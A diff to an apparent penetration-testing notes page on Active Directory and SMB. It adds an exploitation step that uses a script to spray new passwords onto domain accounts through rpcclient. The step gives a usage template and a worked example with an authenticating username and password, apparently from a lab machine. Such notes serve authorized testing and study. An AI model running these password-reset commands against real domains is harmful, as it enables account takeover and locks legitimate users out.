@@ -19,6 +19,18 @@ If you have some user credentials or a shell as a domain user you can get the pa
 
 ### Exploitation
 
+Using [RPCUserInfoSprayer.sh](https://github.com/m3ll-0/ExploitScripts/blob/master/SMB/RPCUserInfoSprayer.sh):
+
+```bash
+RPCUserInfoSprayer.sh <target> <userfile> <new_password> <auth_username> <auth_password>
+```
+
+```bash
+RPCUserInfoSprayer.sh $target /tmp/testusers HelloWorld1 support '#00^BlackKnight'
+```
+
+This tries to change the user passwords using RPCClient, this won't likely lock out the accounts \(not confirmed\). For more information read: [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
+
 Using **crackmapexec:**
 
 ```bash
